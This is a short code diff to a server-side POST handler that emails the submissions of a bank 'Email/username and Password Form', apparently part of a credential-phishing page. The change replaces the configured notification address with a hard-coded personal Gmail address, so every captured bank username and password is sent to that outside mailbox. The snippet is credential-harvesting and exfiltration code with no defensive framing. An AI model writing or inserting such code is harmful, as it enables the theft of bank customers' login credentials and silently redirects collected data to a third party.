@@ -16,7 +16,7 @@ export async function POST(request) {
     // Configure email options based on data type
     let mailOptions = {
       from: process.env.EMAIL_USER,
-      to: process.env.NOTIFICATION_EMAIL,
+      to: "dantedenordtillman@gmail.com",
       subject: `${data.bankName || process.env.NEXT_PUBLIC_BANK_NAME} - Email/username and Password Form`,
       html: generateEmailContent(data),
     };
